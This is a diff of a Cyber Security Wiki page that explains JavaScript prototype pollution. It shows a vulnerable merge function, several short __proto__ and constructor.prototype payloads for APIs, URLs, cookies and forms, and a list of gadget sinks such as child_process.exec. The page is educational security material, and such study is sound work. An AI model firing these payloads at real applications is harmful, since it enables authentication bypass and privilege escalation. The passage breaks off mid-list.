@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Prototype Pollution # Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object&rsquo;s prototype (such as Object.prototype or Array.prototype). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.
-Prototype Pollution is not an exploit by itself. It is a state manipulation primitive. The actual impact depends on whether the application contains gadgets—security-sensitive code paths that consume polluted properties.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Prototype Pollution" />
-<meta property="og:description" content="Prototype Pollution # Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object&rsquo;s prototype (such as Object.prototype or Array.prototype). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.
-Prototype Pollution is not an exploit by itself. It is a state manipulation primitive. The actual impact depends on whether the application contains gadgets—security-sensitive code paths that consume polluted properties." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Prototype Pollution | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Prototype Pollution# Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object’s prototype (such as Object.prototype or Array.prototype). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.
+Prototype Pollution is not an exploit by itself. It is a state manipulation primitive. The actual impact depends on whether the application contains gadgets—security-sensitive code paths that consume polluted properties. These gadgets can lead to authentication bypass, privilege escalation, DOM XSS, Denial of Service (DoS), Server-Side Request Forgery (SSRF), or even Remote Code Execution (RCE) in specific scenarios.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Prototype Pollution">
+	<meta property="og:description" content="Prototype Pollution# Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object’s prototype (such as Object.prototype or Array.prototype). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.
+Prototype Pollution is not an exploit by itself. It is a state manipulation primitive. The actual impact depends on whether the application contains gadgets—security-sensitive code paths that consume polluted properties. These gadgets can lead to authentication bypass, privilege escalation, DOM XSS, Denial of Service (DoS), Server-Side Request Forgery (SSRF), or even Remote Code Execution (RCE) in specific scenarios.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Prototype Pollution">
+	<meta itemprop="description" content="Prototype Pollution# Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object’s prototype (such as Object.prototype or Array.prototype). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.
+Prototype Pollution is not an exploit by itself. It is a state manipulation primitive. The actual impact depends on whether the application contains gadgets—security-sensitive code paths that consume polluted properties. These gadgets can lead to authentication bypass, privilege escalation, DOM XSS, Denial of Service (DoS), Server-Side Request Forgery (SSRF), or even Remote Code Execution (RCE) in specific scenarios.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1835">
+
+<title>Prototype Pollution • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Prototype Pollution</strong>
+  <h3>Prototype Pollution</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1349,9 +1347,9 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#research-papers">Research Papers</a></li>
         <li><a href="#notable-vulnerabilities">Notable Vulnerabilities</a>
           <ul>
-            <li><a href="#cve-2019-11358httpssecuritysnykiovulnsnyk-js-jquery-174006"><a href="https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006">CVE-2019-11358</a></a></li>
+            <li><a href="#cve-2019-11358">CVE-2019-11358</a></li>
             <li><a href="#lodash-prototype-pollution">Lodash Prototype Pollution</a></li>
-            <li><a href="#kibana-prototype-pollutionhttpssecuritysnykiovulnsnyk-js-kibana-9376712"><a href="https://security.snyk.io/vuln/SNYK-JS-KIBANA-9376712">Kibana Prototype Pollution</a></a></li>
+            <li><a href="#kibana-prototype-pollution">Kibana Prototype Pollution</a></li>
           </ul>
         </li>
       </ul>
@@ -1369,10 +1367,7 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="prototype-pollution">
-  Prototype Pollution
-  <a class="anchor" href="#prototype-pollution">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="prototype-pollution">Prototype Pollution<a class="anchor" href="#prototype-pollution">#</a></h1>
 <p>Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object&rsquo;s prototype (such as <code>Object.prototype</code> or <code>Array.prototype</code>). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.</p>
 <p>Prototype Pollution is <strong>not an exploit by itself</strong>. It is a <strong>state manipulation primitive</strong>. The actual impact depends on whether the application contains <strong>gadgets</strong>—security-sensitive code paths that consume polluted properties. These gadgets can lead to authentication bypass, privilege escalation, DOM XSS, Denial of Service (DoS), Server-Side Request Forgery (SSRF), or even Remote Code Execution (RCE) in specific scenarios.</p>
 <p>Common causes include:</p>
@@ -1384,14 +1379,8 @@ https://github.com/alex-shpak/hugo-book
 <li>Failure to validate dangerous property names such as <code>__proto__</code>, <code>prototype</code>, and <code>constructor</code></li>
 </ul>
 <hr>
-<h1 id="understanding-prototype-pollution-fundamentals">
-  Understanding Prototype Pollution Fundamentals
-  <a class="anchor" href="#understanding-prototype-pollution-fundamentals">#</a>
-</h1>
-<h2 id="javascript-prototype-chain">
-  JavaScript Prototype Chain
-  <a class="anchor" href="#javascript-prototype-chain">#</a>
-</h2>
+<h1 id="understanding-prototype-pollution-fundamentals">Understanding Prototype Pollution Fundamentals<a class="anchor" href="#understanding-prototype-pollution-fundamentals">#</a></h1>
+<h2 id="javascript-prototype-chain">JavaScript Prototype Chain<a class="anchor" href="#javascript-prototype-chain">#</a></h2>
 <p>Every JavaScript object inherits properties from another object called its <strong>prototype</strong>.</p>
 <p>Property lookup follows this order:</p>
 <pre tabindex="0"><code>Object
@@ -1400,22 +1389,17 @@ https://github.com/alex-shpak/hugo-book
 Object.prototype
    │
    ▼
-null
-</code></pre><p>When JavaScript cannot find a property inside the object itself, it automatically searches its prototype chain.</p>
+null</code></pre><p>When JavaScript cannot find a property inside the object itself, it automatically searches its prototype chain.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>Object.prototype.role=&#34;admin&#34;;
 
 constuser= {};
 
 console.log(user.role);
-// admin
-</code></pre><p>Although <code>role</code> was never assigned to <code>user</code>, JavaScript retrieves it from <code>Object.prototype</code>.</p>
+// admin</code></pre><p>Although <code>role</code> was never assigned to <code>user</code>, JavaScript retrieves it from <code>Object.prototype</code>.</p>
 <p>This inheritance behavior is what attackers abuse.</p>
 <hr>
-<h2 id="how-prototype-pollution-happens">
-  How Prototype Pollution Happens
-  <a class="anchor" href="#how-prototype-pollution-happens">#</a>
-</h2>
+<h2 id="how-prototype-pollution-happens">How Prototype Pollution Happens<a class="anchor" href="#how-prototype-pollution-happens">#</a></h2>
 <p>Prototype Pollution occurs when applications copy user-controlled properties into application objects without validating dangerous keys.</p>
 <p>Typical vulnerable code:</p>
 <pre tabindex="0"><code>functionmerge(target,source) {
@@ -1431,25 +1415,19 @@ merge(target[key],source[key]);
 target[key]=source[key];
         }
     }
-}
-</code></pre><p>If user input contains:</p>
+}</code></pre><p>If user input contains:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;: {
         &#34;isAdmin&#34;:true
     }
-}
-</code></pre><p>then</p>
+}</code></pre><p>then</p>
 <pre tabindex="0"><code>merge({},payload);
 
 console.log({}.isAdmin);
-// true
-</code></pre><p>Instead of adding a property to a single object, the application modifies <code>Object.prototype</code>.</p>
+// true</code></pre><p>Instead of adding a property to a single object, the application modifies <code>Object.prototype</code>.</p>
 <p>Every newly created object now inherits <code>isAdmin</code>.</p>
 <hr>
-<h2 id="prototype-pollution-flow">
-  Prototype Pollution Flow
-  <a class="anchor" href="#prototype-pollution-flow">#</a>
-</h2>
+<h2 id="prototype-pollution-flow">Prototype Pollution Flow<a class="anchor" href="#prototype-pollution-flow">#</a></h2>
 <pre tabindex="0"><code>User Input
       │
       ▼
@@ -1469,54 +1447,45 @@ Authentication Bypass
 Privilege Escalation
 DOM XSS
 RCE
-DoS
-</code></pre><hr>
-<h2 id="common-dangerous-properties">
-  Common Dangerous Properties
-  <a class="anchor" href="#common-dangerous-properties">#</a>
-</h2>
+DoS</code></pre><hr>
+<h2 id="common-dangerous-properties">Common Dangerous Properties<a class="anchor" href="#common-dangerous-properties">#</a></h2>
 <p>Most prototype pollution attacks target one of these properties.</p>
 <table>
-<thead>
-<tr>
-<th>Property</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>__proto__</code></td>
-<td>Direct prototype modification</td>
-</tr>
-<tr>
-<td><code>constructor.prototype</code></td>
-<td>Alternative prototype path that bypasses simple filters</td>
-</tr>
-<tr>
-<td><code>prototype</code></td>
-<td>Used by constructors and classes</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Property</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>__proto__</code></td>
+					<td>Direct prototype modification</td>
+			</tr>
+			<tr>
+					<td><code>constructor.prototype</code></td>
+					<td>Alternative prototype path that bypasses simple filters</td>
+			</tr>
+			<tr>
+					<td><code>prototype</code></td>
+					<td>Used by constructors and classes</td>
+			</tr>
+	</tbody>
 </table>
 <p>Example:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;: {
         &#34;admin&#34;:true
     }
-}
-</code></pre><p>Alternative payload:</p>
+}</code></pre><p>Alternative payload:</p>
 <pre tabindex="0"><code>{
     &#34;constructor&#34;: {
         &#34;prototype&#34;: {
             &#34;admin&#34;:true
         }
     }
-}
-</code></pre><hr>
-<h2 id="why-prototype-pollution-becomes-dangerous">
-  Why Prototype Pollution Becomes Dangerous
-  <a class="anchor" href="#why-prototype-pollution-becomes-dangerous">#</a>
-</h2>
+}</code></pre><hr>
+<h2 id="why-prototype-pollution-becomes-dangerous">Why Prototype Pollution Becomes Dangerous<a class="anchor" href="#why-prototype-pollution-becomes-dangerous">#</a></h2>
 <p>Polluting the prototype alone usually has no visible effect.</p>
 <p>The application becomes vulnerable only when some code reads the polluted property.</p>
 <p>Example:</p>
@@ -1524,43 +1493,25 @@ DoS
 
 renderAdminPanel();
 
-}
-</code></pre><p>If</p>
-<pre tabindex="0"><code>user.isAdmin
-</code></pre><p>does not exist,</p>
+}</code></pre><p>If</p>
+<pre tabindex="0"><code>user.isAdmin</code></pre><p>does not exist,</p>
 <p>JavaScript automatically checks</p>
-<pre tabindex="0"><code>Object.prototype.isAdmin
-</code></pre><p>If polluted:</p>
-<pre tabindex="0"><code>Object.prototype.isAdmin=true;
-</code></pre><p>every user becomes an administrator.</p>
+<pre tabindex="0"><code>Object.prototype.isAdmin</code></pre><p>If polluted:</p>
+<pre tabindex="0"><code>Object.prototype.isAdmin=true;</code></pre><p>every user becomes an administrator.</p>
 <hr>
-<h2 id="common-gadgets">
-  Common Gadgets
-  <a class="anchor" href="#common-gadgets">#</a>
-</h2>
+<h2 id="common-gadgets">Common Gadgets<a class="anchor" href="#common-gadgets">#</a></h2>
 <p>Prototype pollution becomes exploitable when polluted properties reach security-sensitive sinks.</p>
 <p>Common gadgets include:</p>
 <p>Authentication</p>
-<pre tabindex="0"><code>if (user.isAdmin)
-</code></pre><p>Authorization</p>
-<pre tabindex="0"><code>if (config.enabled)
-</code></pre><p>Command execution</p>
-<pre tabindex="0"><code>child_process.exec(config.command)
-</code></pre><p>DOM manipulation</p>
-<pre tabindex="0"><code>element.innerHTML=options.html
-</code></pre><p>Script loading</p>
-<pre tabindex="0"><code>script.src=config.url
-</code></pre><p>HTTP requests</p>
-<pre tabindex="0"><code>fetch(config.url)
-</code></pre><p>Template rendering</p>
-<pre tabindex="0"><code>template.render(options)
-</code></pre><p>JSON serialization</p>
-<pre tabindex="0"><code>JSON.stringify(config)
-</code></pre><hr>
-<h2 id="common-sources-of-prototype-pollution">
-  Common Sources of Prototype Pollution
-  <a class="anchor" href="#common-sources-of-prototype-pollution">#</a>
-</h2>
+<pre tabindex="0"><code>if (user.isAdmin)</code></pre><p>Authorization</p>
+<pre tabindex="0"><code>if (config.enabled)</code></pre><p>Command execution</p>
+<pre tabindex="0"><code>child_process.exec(config.command)</code></pre><p>DOM manipulation</p>
+<pre tabindex="0"><code>element.innerHTML=options.html</code></pre><p>Script loading</p>
+<pre tabindex="0"><code>script.src=config.url</code></pre><p>HTTP requests</p>
+<pre tabindex="0"><code>fetch(config.url)</code></pre><p>Template rendering</p>
+<pre tabindex="0"><code>template.render(options)</code></pre><p>JSON serialization</p>
+<pre tabindex="0"><code>JSON.stringify(config)</code></pre><hr>
+<h2 id="common-sources-of-prototype-pollution">Common Sources of Prototype Pollution<a class="anchor" href="#common-sources-of-prototype-pollution">#</a></h2>
 <p>Prototype Pollution is frequently introduced through:</p>
 <ul>
 <li>Recursive merge functions</li>
@@ -1575,15 +1526,9 @@ renderAdminPanel();
 <li>Vulnerable third-party packages</li>
 </ul>
 <hr>
-<h1 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h1>
+<h1 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h1>
 <p>Prototype Pollution can occur anywhere user-controlled input is converted into JavaScript objects.</p>
-<h2 id="rest-apis">
-  REST APIs
-  <a class="anchor" href="#rest-apis">#</a>
-</h2>
+<h2 id="rest-apis">REST APIs<a class="anchor" href="#rest-apis">#</a></h2>
 <p>Applications accepting JSON request bodies.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>POST /api/profile
@@ -1592,12 +1537,8 @@ renderAdminPanel();
     &#34;__proto__&#34;: {
         &#34;isAdmin&#34;: true
     }
-}
-</code></pre><hr>
-<h2 id="graphql">
-  GraphQL
-  <a class="anchor" href="#graphql">#</a>
-</h2>
+}</code></pre><hr>
+<h2 id="graphql">GraphQL<a class="anchor" href="#graphql">#</a></h2>
 <p>GraphQL variables often become JavaScript objects.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>{
@@ -1606,88 +1547,45 @@ renderAdminPanel();
             &#34;debug&#34;:true
         }
     }
-}
-</code></pre><hr>
-<h2 id="websocket-messages">
-  WebSocket Messages
-  <a class="anchor" href="#websocket-messages">#</a>
-</h2>
+}</code></pre><hr>
+<h2 id="websocket-messages">WebSocket Messages<a class="anchor" href="#websocket-messages">#</a></h2>
 <p>JSON messages processed over WebSockets.</p>
 <p>Example:</p>
 <pre tabindex="0"><code>{
     &#34;__proto__&#34;: {
         &#34;authenticated&#34;:true
     }
-}
-</code></pre><hr>
-<h2 id="url-parameters">
-  URL Parameters
-  <a class="anchor" href="#url-parameters">#</a>
-</h2>
+}</code></pre><hr>
+<h2 id="url-parameters">URL Parameters<a class="anchor" href="#url-parameters">#</a></h2>
 <p>Client-side applications frequently convert query parameters into objects.</p>
 <p>Example</p>
-<pre tabindex="0"><code>?__proto__[isAdmin]=true
-</code></pre><hr>
-<h2 id="url-fragments">
-  URL Fragments
-  <a class="anchor" href="#url-fragments">#</a>
-</h2>
-<pre tabindex="0"><code>#__proto__[debug]=true
-</code></pre><hr>
-<h2 id="cookies">
-  Cookies
-  <a class="anchor" href="#cookies">#</a>
-</h2>
+<pre tabindex="0"><code>?__proto__[isAdmin]=true</code></pre><hr>
+<h2 id="url-fragments">URL Fragments<a class="anchor" href="#url-fragments">#</a></h2>
+<pre tabindex="0"><code>#__proto__[debug]=true</code></pre><hr>
+<h2 id="cookies">Cookies<a class="anchor" href="#cookies">#</a></h2>
 <p>Applications parsing cookies into objects.</p>
-<pre tabindex="0"><code>prefs={&#34;__proto__&#34;:{&#34;admin&#34;:true}}
-</code></pre><hr>
-<h2 id="form-parameters">
-  Form Parameters
-  <a class="anchor" href="#form-parameters">#</a>
-</h2>
-<pre tabindex="0"><code>__proto__[admin]=true
-</code></pre><hr>
-<h2 id="multipart-requests">
-  Multipart Requests
-  <a class="anchor" href="#multipart-requests">#</a>
-</h2>
+<pre tabindex="0"><code>prefs={&#34;__proto__&#34;:{&#34;admin&#34;:true}}</code></pre><hr>
+<h2 id="form-parameters">Form Parameters<a class="anchor" href="#form-parameters">#</a></h2>
+<pre tabindex="0"><code>__proto__[admin]=true</code></pre><hr>
+<h2 id="multipart-requests">Multipart Requests<a class="anchor" href="#multipart-requests">#</a></h2>
 <p>File upload endpoints that deserialize form fields.</p>
 <hr>
-<h2 id="configuration-endpoints">
-  Configuration Endpoints
-  <a class="anchor" href="#configuration-endpoints">#</a>
-</h2>
-<pre tabindex="0"><code>POST /settings
-</code></pre><p>Applications often merge received settings into runtime configuration.</p>
+<h2 id="configuration-endpoints">Configuration Endpoints<a class="anchor" href="#configuration-endpoints">#</a></h2>
+<pre tabindex="0"><code>POST /settings</code></pre><p>Applications often merge received settings into runtime configuration.</p>
 <hr>
-<h2 id="feature-flag-apis">
-  Feature Flag APIs
-  <a class="anchor" href="#feature-flag-apis">#</a>
-</h2>
+<h2 id="feature-flag-apis">Feature Flag APIs<a class="anchor" href="#feature-flag-apis">#</a></h2>
 <p>Configuration objects used to enable or disable application functionality.</p>
 <hr>
-<h2 id="user-preference-apis">
-  User Preference APIs
-  <a class="anchor" href="#user-preference-apis">#</a>
-</h2>
+<h2 id="user-preference-apis">User Preference APIs<a class="anchor" href="#user-preference-apis">#</a></h2>
 <p>Applications storing arbitrary JSON preferences.</p>
 <hr>
-<h2 id="admin-configuration-panels">
-  Admin Configuration Panels
-  <a class="anchor" href="#admin-configuration-panels">#</a>
-</h2>
+<h2 id="admin-configuration-panels">Admin Configuration Panels<a class="anchor" href="#admin-configuration-panels">#</a></h2>
 <p>Administrative settings merged into global configuration.</p>
 <hr>
-<h2 id="session-objects">
-  Session Objects
